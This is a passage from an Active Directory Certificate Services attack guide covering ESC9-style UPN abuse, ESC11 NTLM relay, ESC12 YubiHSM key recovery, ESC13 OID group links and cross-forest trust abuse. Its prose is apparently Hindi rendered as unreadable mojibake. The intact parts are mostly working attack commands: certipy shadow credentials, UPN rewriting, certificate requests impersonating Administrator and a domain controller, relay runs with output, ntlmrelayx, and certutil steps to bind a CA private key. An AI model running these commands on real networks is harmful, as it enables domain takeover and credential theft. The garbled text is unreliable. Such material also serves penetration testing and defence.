рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, `Jane@corp.local` рдкрд░ `GenericWrite` рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реЛрдиреЗ рдкрд░, рд╣рдорд▓рд╛рд╡рд░ `Administrator@corp.local` рдХреЛ рдХрдВрдкреНрд░реЛрдорд╛рдЗрдЬрд╝ рдХрд░рдиреЗ рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп рд░рдЦрддрд╛ рд╣реИред рдкреНрд░рдХреНрд░рд┐рдпрд╛ ESC9 рдХреЛ рдорд┐рд░рд░ рдХрд░рддреА рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдХрд┐рд╕реА рднреА рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкреНрд▓реЗрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рд╢реБрд░реВ рдореЗрдВ, `Jane` рдХреА рд╣реИрд╢ Shadow Credentials рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рд╛рдкреНрдд рдХреА рдЬрд╛рддреА рд╣реИ, `GenericWrite` рдХрд╛ рд╢реЛрд╖рдг рдХрд░рддреЗ рд╣реБрдПред
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
рдЗрд╕рдХреЗ рдмрд╛рдж, `Jane` рдХрд╛ `userPrincipalName` `Administrator` рдореЗрдВ рдмрджрд▓ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, `@corp.local` рднрд╛рдЧ рдХреЛ рдЬрд╛рдирдмреВрдЭрдХрд░ рдЫреЛрдбрд╝ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдХреЛрдИ рдкреНрд░рддрд┐рдмрдВрдз рдЙрд▓реНрд▓рдВрдШрди рди рд╣реЛред
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЗ рдЕрдиреБрд╕рд╛рд░, рдПрдХ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЬреЛ рдХреНрд▓рд╛рдЗрдВрдЯ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╕рдХреНрд╖рдо рдХрд░рддрд╛ рд╣реИ, `Jane` рдХреЗ рд░реВрдк рдореЗрдВ рдЕрдиреБрд░реЛрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдбрд┐рдлрд╝реЙрд▓реНрдЯ `User` рдЯреЗрдореНрдкрд▓реЗрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗред
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane` рдХрд╛ `userPrincipalName` рдлрд┐рд░ рд╕реЗ рдЙрд╕рдХреЗ рдореВрд▓, `Jane@corp.local` рдкрд░ рд╡рд╛рдкрд╕ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
рдкреНрд░рд╛рдкреНрдд рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреЗ рд╕рд╛рде рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд░рдиреЗ рд╕реЗ `Administrator@corp.local` рдХрд╛ рдПрдирдЯреА рд╣реИрд╢ рдкреНрд░рд╛рдкреНрдд рд╣реЛрдЧрд╛, рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдореЗрдВ рдбреЛрдореЗрди рд╡рд┐рд╡рд░рдгреЛрдВ рдХреА рдЕрдиреБрдкрд╕реНрдерд┐рддрд┐ рдХреЗ рдХрд╛рд░рдг рдХрдорд╛рдВрдб рдореЗрдВ рдбреЛрдореЗрди рдХреА рд╡рд┐рд╢реЗрд╖реАрдХрд░рдг рдЖрд╡рд╢реНрдпрдХ рд╣реИред
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### рджреБрд░реБрдкрдпреЛрдЧ рдорд╛рдорд▓рд╛ 2

`CertificateMappingMethods` рдореЗрдВ `UPN` рдмрд┐рдЯ рдлреНрд▓реИрдЧ (`0x4`) рд╢рд╛рдорд┐рд▓ рд╣реЛрдиреЗ рдкрд░, рдПрдХ рдЦрд╛рддрд╛ A рдЬрд┐рд╕рдореЗрдВ `GenericWrite` рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реИрдВ, рдХрд┐рд╕реА рднреА рдЦрд╛рддрд╛ B рдХреЛ рдХрдВрдкреНрд░реЛрдорд╛рдЗрдЬ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ `userPrincipalName` рдЧреБрдгрд╡рддреНрддрд╛ рдирд╣реАрдВ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдорд╢реАрди рдЦрд╛рддреЗ рдФрд░ рдирд┐рд░реНрдорд┐рдд рдбреЛрдореЗрди рдкреНрд░рд╢рд╛рд╕рдХ `Administrator` рд╢рд╛рдорд┐рд▓ рд╣реИрдВред

рдпрд╣рд╛рдБ, рд▓рдХреНрд╖реНрдп `DC$@corp.local` рдХреЛ рдХрдВрдкреНрд░реЛрдорд╛рдЗрдЬ рдХрд░рдирд╛ рд╣реИ, `Jane` рдХреЗ рд╣реИрд╢ рдХреЛ рд╢реИрдбреЛ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд░рдХреЗ, `GenericWrite` рдХрд╛ рд▓рд╛рдн рдЙрдард╛рддреЗ рд╣реБрдПред
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`Jane` рдХрд╛ `userPrincipalName` рдлрд┐рд░ `DC$@corp.local` рдкрд░ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
рдПрдХ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреНрд▓рд╛рдЗрдВрдЯ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рд▓рд┐рдП `Jane` рдХреЗ рд░реВрдк рдореЗрдВ `User` рдЯреЗрдореНрдкрд▓реЗрдЯ рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane` рдХрд╛ `userPrincipalName` рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рдмрд╛рдж рдЕрдкрдиреЗ рдореВрд▓ рд╕реНрдерд┐рддрд┐ рдореЗрдВ рд╡рд╛рдкрд╕ рд▓реМрдЯ рдЬрд╛рддрд╛ рд╣реИред
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
рдХреЛрд░реНрдк\рдбреАрд╕реА$ рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╕рдлрд▓рддрд╛ рдХреЛ рд╕реВрдЪрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, Certipy рдХрд╛ `-ldap-shell` рд╡рд┐рдХрд▓реНрдк рдкреНрд░рдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
рдкреНрд░рдореБрдЦ рдирд┐рдпрдВрддреНрд░рдХ рдХреЛ рдХреНрд╖рддрд┐ рдкрд╣реБрдВрдЪрд╛рдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рд╡рд╛рд▓реЗ рд╕рдВрдХрдЯрд┐рдд рдЕрдзрд┐рдХрд╛рд░ рджреЗрдиреЗ (RBCD) рд╣рдорд▓реЛрдВ рдХреЛ рд╕рдХреНрд╖рдо рдХрд░рдиреЗ рдЬреИрд╕реЗ рдЖрджреЗрд╢реЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ LDAP рд╢реИрд▓реА рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ `set_rbcd` рдЬреИрд╕реЗ рдХрдорд╛рдВрдбреНрд╕ред
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
рдпрд╣ рджреБрд░реБрдкрдпреЛрдЧрддрд╛ рдХрд┐рд╕реА рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рддреЗ рддрдХ рдлреИрд▓рддреА рд╣реИ рдЬрд┐рд╕рдореЗрдВ `userPrincipalName` рдЕрднрд╛рд╡ рд╣реИ рдпрд╛ рдЬрд╣рд╛рдВ рдпрд╣ `sAMAccountName` рд╕реЗ рдореЗрд▓ рдирд╣реАрдВ рдЦрд╛рддрд╛, рдбрд┐рдлрд╝реЙрд▓реНрдЯ `Administrator@corp.local` рдПрдХ рдкреНрд░рдореБрдЦ рд▓рдХреНрд╖реНрдп рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕рдХреЗ рдЙрдЪреНрдЪ LDAP рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╣реЛрддреЗ рд╣реИрдВ рдФрд░ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ `userPrincipalName` рдХреА рдЕрдиреБрдкрд╕реНрдерд┐рддрд┐ рд╣реЛрддреА рд╣реИред

## ICPR рдХреЛ NTLM рдкрд░ рд░рд┐рд▓реЗ рдХрд░рдирд╛ - ESC11

### рд╕реНрдкрд╖реНрдЯреАрдХрд░рдг

рдпрджрд┐ CA рд╕рд░реНрд╡рд░ `IF_ENFORCEENCRYPTICERTREQUEST` рдХреЗ рд╕рд╛рде рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдирд╣реАрдВ рд╣реИ, рддреЛ RPC рд╕реЗрд╡рд╛ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рд╛рдЗрди рди рдХрд░рдХреЗ NTLM рд░рд┐рд▓реЗ рд╣рдорд▓реЗ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред [рдпрд╣рд╛рдБ рд╕рдВрджрд░реНрдн](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/) рдореЗрдВред

рдЖрдк `certipy` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдпрджрд┐ `Enforce Encryption for Requests` рдЕрдХреНрд╖рдо рд╣реИ рдФрд░ certipy `ESC11` рджреБрд░реБрдкрдпреЛрдЧрддрд╛рдУрдВ рдХреЛ рджрд┐рдЦрд╛рдПрдЧрд╛ред
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### рджреБрд░реБрдкрдпреЛрдЧ рд╕реНрдерд┐рддрд┐

рдПрдХ рд░рд┐рд▓реЗ рд╕рд░реНрд╡рд░ рд╕реЗрдЯрдЕрдк рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ:
``` bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
рдиреЛрдЯ: рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░реНрд╕ рдХреЗ рд▓рд┐рдП, рд╣рдореЗрдВ DomainController рдореЗрдВ `-template` рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдПред

рдпрд╛ [sploutchy рдХреЗ impacket рдХреА fork](https://github.com/sploutchy/impacket) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ:
``` bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## рдПрдбреАрд╕реАрдПрд╕ рд╕реАрдП рдХреЛ YubiHSM рдХреЗ рд╕рд╛рде рд╢реИрд▓ рдПрдХреНрд╕реЗрд╕ - ESC12

### рд╕реНрдкрд╖реНрдЯреАрдХрд░рдг

рдкреНрд░рд╢рд╛рд╕рдХ рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдЕрдереЙрд░рд┐рдЯреА рдХреЛ "Yubico YubiHSM2" рдЬреИрд╕реА рдмрд╛рд╣реНрдп рдЙрдкрдХрд░рдг рдкрд░ рд╕реЗрдЯ рдЕрдк рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдпрджрд┐ USB рдЙрдкрдХрд░рдг рд╕реАрдП рд╕рд░реНрд╡рд░ рд╕реЗ рдПрдХ USB рдкреЛрд░реНрдЯ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдпрд╛ рдПрдХ USB рдЙрдкрдХрд░рдг рд╕рд░реНрд╡рд░ рдХреА рд╕реНрдерд┐рддрд┐ рдореЗрдВ, рддреЛ YubiHSM рдореЗрдВ рдХреБрдВрдЬ рд╕рдВрдЧреНрд░рд╣ рдкреНрд░рджрд╛рддрд╛ рдХреЗ рд▓рд┐рдП рдПрдХ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреБрдВрдЬ (рдХрднреА-рдХрднреА "рдкрд╛рд╕рд╡рд░реНрдб" рдХреЗ рд░реВрдк рдореЗрдВ рд╕рдВрджрд░реНрднрд┐рдд) рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ рддрд╛рдХрд┐ рдХреБрдВрдЬ рдЙрддреНрдкрдиреНрди рдФрд░ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХреЗред

рдпрд╣ рдХреБрдВрдЬ/рдкрд╛рд╕рд╡рд░реНрдб рд╕реНрдкрд╖реНрдЯ рдкрд╛рда рдореЗрдВ `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` рдХреЗ рддрд╣рдд рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реИред

рд╕рдВрджрд░реНрдн [рдпрд╣рд╛рдБ](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm) рдореЗрдВред

### рджреБрд░реБрдкрдпреЛрдЧ рд╕реНрдерд┐рддрд┐

рдпрджрд┐ рд╕реАрдП рдХреА рдирд┐рдЬреА рдХреБрдВрдЬ рдПрдХ рднреМрддрд┐рдХ USB рдЙрдкрдХрд░рдг рдкрд░ рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реИ рдЬрдм рдЖрдкрдХреЗ рдкрд╛рд╕ рд╢реИрд▓ рдПрдХреНрд╕реЗрд╕ рд╣реИ, рддреЛ рдХреБрдВрдЬ рдХреЛ рдкреБрдирдГ рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИред

рдкрд╣рд▓реЗ, рдЖрдкрдХреЛ рд╕реАрдП рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рд╣реЛрдЧрд╛ (рдпрд╣ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рд╣реИ) рдФрд░ рдлрд┐рд░:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
## OID рдЧреНрд░реБрдк рд▓рд┐рдВрдХ рджреБрд░реБрдкрдпреЛрдЧ - ESC13

### рд╡реНрдпрд╛рдЦреНрдпрд╛

The `msPKI-Certificate-Policy` attribute allows the issuance policy to be added to the certificate template. The `msPKI-Enterprise-Oid` objects that are responsible for issuing policies can be discovered in the Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) of the PKI OID container. A policy can be linked to an AD group using this object's `msDS-OIDToGroupLink` attribute, enabling a system to authorize a user who presents the certificate as though he were a member of the group. [Reference in here](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).

In other words, when a user has permission to enroll a certificate and the certificate is link to an OID group, the user can inherit the privileges of this group.

Use [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) to find OIDToGroupLink:
```powershell
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### рджреБрд░реБрдкрдпреЛрдЧ рд╕реНрдерд┐рддрд┐

`certipy find` рдпрд╛ `Certify.exe find /showAllPermissions` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдЙрдкрдпреЛрдХреНрддрд╛ рдЕрдиреБрдорддрд┐ рдЦреЛрдЬреЗрдВред

рдпрджрд┐ `John` рдХреЛ `VulnerableTemplate` рдХреЛ рдирд╛рдорд╛рдВрдХрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИ, рддреЛ рдЙрдкрдпреЛрдХреНрддрд╛ `VulnerableGroup` рд╕рдореВрд╣ рдХреА рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдЕрдиреБрдЧреНрд░рд╣рд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред

рдЗрд╕рдХреЗ рд▓рд┐рдП рдХреЗрд╡рд▓ рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдирд╛ рд╣реЛрдЧрд╛, рдпрд╣ OIDToGroupLink рдЕрдзрд┐рдХрд╛рд░реЛрдВ рд╡рд╛рд▓рд╛ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдЧрд╛ред
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## рдкреНрд░рдорд╛рдгрдкрддреНрд░реЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╡рдиреЛрдВ рдХреЛ рдХрдордЬреЛрд░ рдХрд░рдирд╛ рд╕реНрд╡рд░реВрдкрд┐рдд рд░реВрдк рдореЗрдВ рд╕рдордЭрд╛рдпрд╛ рдЧрдпрд╛

### рд╕рдВрдХрдЯрд┐рдд рд╕реАрдП рдХреЗ рджреНрд╡рд╛рд░рд╛ рд╡рди рд╡рд┐рд╢реНрд╡рд╛рд╕ рдЯреЛрдбрд╝рдирд╛

**рдХреНрд░реЙрд╕-рд╡рди рдирд╛рдорд╛рдВрдХрди** рдХреЗ рд▓рд┐рдП рд╡рд┐рдиреНрдпрд╛рд╕ рдХреЛ рдЕрдиреБрдХреВрд▓ рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред **рд╕рдВрд╕рд╛рдзрди рд╡рди** рд╕реЗ **рдореВрд▓ рд╕реАрдП рдкреНрд░рдорд╛рдгрдкрддреНрд░** рдХреЛ рдкреНрд░рдмрдВрдзрдХреЛрдВ рджреНрд╡рд╛рд░рд╛ **рдЦрд╛рддрд╛ рд╡рдиреЛрдВ рдореЗрдВ рдкреНрд░рдХрд╛рд╢рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**, рдФрд░ **рд╕рдВрд╕рд╛рдзрди рд╡рди рд╕реЗ рдЙрджреНрдпрдо рд╕реАрдП** рдкреНрд░рдорд╛рдгрдкрддреНрд░ **рдкреНрд░рддреНрдпреЗрдХ рдЦрд╛рддрд╛ рд╡рди рдореЗрдВ `NTAuthCertificates` рдФрд░ AIA рдХрдВрдЯреЗрдирд░ рдореЗрдВ рдЬреЛрдбрд╝реЗ рдЬрд╛рддреЗ рд╣реИрдВ**ред рд╕реНрдкрд╖реНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдпрд╣ рд╡реНрдпрд╡рд╕реНрдерд╛ **рд╕рдВрд╕рд╛рдзрди рд╡рди рдореЗрдВ рд╕реАрдП рдХреЛ рдкреВрд░реНрдг рдирд┐рдпрдВрддреНрд░рдг** рдкреНрд░рджрд╛рди рдХрд░рддреА рд╣реИ рд╕рднреА рдЕрдиреНрдп рд╡рдиреЛрдВ рдкрд░ рдЬрд┐рдирдХрд╛ рдкреАрдХреЗрдЖрдИ рд╡рд╣ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░рддрд╛ рд╣реИред рдпрджрд┐ рдпрд╣ рд╕реАрдП **рд╣рдорд▓рд╛рд╡рд░реЛрдВ рджреНрд╡рд╛рд░рд╛ рд╕рдВрдХрдЯрд┐рдд рд╣реЛ рдЬрд╛рдП**, рддреЛ рд╕рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдкреНрд░рдорд╛рдгрдкрддреНрд░ **рдЙрдирдХреЗ рджреНрд╡рд╛рд░рд╛ рдЬрд╛рд▓реА рдмрдирд╛рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ**, рдЗрд╕рдХреЗ рдлрд▓рд╕реНрд╡рд░реВрдк рд╕реБрд░рдХреНрд╖рд╛ рд╕реАрдорд╛ рдХреЛ рд╡рди рдХрд╛ рддреЛрдбрд╝ рджрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

### рд╡рд┐рджреЗрд╢реА рд╕рд┐рджреНрдзрд╛рдВрддреЛрдВ рдХреЛ рдирд╛рдорд╛рдВрдХрди рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рджрд╛рди рдХрд┐рдП рдЧрдП

рдорд▓реНрдЯреА-рд╡рди рдкрд░рд┐рд╡реЗрд╢реЛрдВ рдореЗрдВ, рд╕рддрд░реНрдХрддрд╛ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рдЬреЛ рдЙрди рдЙрджреНрдпрдо рд╕реАрдП рдЬреЛ **рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкрд▓реЗрдЯ рдкреНрд░рдХрд╛рд╢рд┐рдд рдХрд░рддреЗ рд╣реИрдВ** рдЬрд┐рдиреНрд╣реЗрдВ **рдкреНрд░рдорд╛рдгрд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдпрд╛ рд╡рд┐рджреЗрд╢реА рд╕рд┐рджреНрдзрд╛рдВрддреЛрдВ** (рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛/рд╕рдореВрд╣ рд╡рди рд╕реЗ рдмрд╛рд╣рд░реА рд╡рди рдХреЗ рд▓рд┐рдП) **рдирд╛рдорд╛рдВрдХрди рдФрд░ рд╕рдВрдкрд╛рджрди рдЕрдзрд┐рдХрд╛рд░** рджреЗрддреЗ рд╣реИрдВред\
рд╡рд┐рд╢реНрд╡рд╛рд╕ рдХреЗ рдЕрдзрд┐рдХрд╛рд░рдг рдХреЗ рдЕрд╡рд╕рд░ рдкрд░, рдПрдбреА рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдЯреЛрдХрди рдореЗрдВ **рдкреНрд░рдорд╛рдгрд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ SID** рдЬреЛрдбрд╝рд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕ рдкреНрд░рдХрд╛рд░, рдпрджрд┐ рдХрд┐рд╕реА рдбреЛрдореЗрди рдХреЗ рдкрд╛рд╕ рдПрдХ рдЙрджреНрдпрдо рд╕реАрдП рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдПрдХ рдЯреЗрдореНрдкрд▓реЗрдЯ рд╣реИ рдЬреЛ **рдкреНрд░рдорд╛рдгрд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдирд╛рдорд╛рдВрдХрди рдЕрдзрд┐рдХрд╛рд░** рджреЗрддрд╛ рд╣реИ, рддреЛ рдПрдХ рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреЛ рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ **рдПрдХ рд╡рд┐рднрд┐рдиреНрди рд╡рди рд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рдирд╛рдорд╛рдВрдХрди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**ред рдЙрд╕реА рдкреНрд░рдХрд╛рд░, рдпрджрд┐ **рдЯреЗрдореНрдкрд▓реЗрдЯ рджреНрд╡рд╛рд░рд╛ рд╡рд┐рджреЗрд╢реА рд╕рд┐рджреНрдзрд╛рдВрдд рдХреЛ рдирд╛рдорд╛рдВрдХрди рдЕрдзрд┐рдХрд╛рд░ рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдкреНрд░рджрд╛рди рдХрд┐рдП рдЧрдП рд╣реЛрдВ**, рддреЛ рдПрдХ **рд╡рди рд╕реЗ рдПрдХ рдЕрдиреНрдп рд╡рди рдореЗрдВ рдЯреЗрдореНрдкрд▓реЗрдЯ рдореЗрдВ рдирд╛рдорд╛рдВрдХрди рдХрд░рдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рд╣реЛрддреА рд╣реИ**ред

рджреЛрдиреЛрдВ рд╕реНрдерд┐рддрд┐рдпрд╛рдБ рдПрдХ рд╡рди рд╕реЗ рджреВрд╕рд░реЗ рд╡рди рдореЗрдВ **рд╣рдорд▓реЗ рдХреА рд╕рддрд╣ рдореЗрдВ рд╡реГрджреНрдзрд┐** рдХрд░рддреА рд╣реИред рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреА рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рджреНрд╡рд╛рд░рд╛ рдПрдХ рд╡рд┐рджреЗрд╢реА рдбреЛрдореЗрди рдореЗрдВ рдЕрддрд┐рд░рд┐рдХреНрдд рдЕрдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
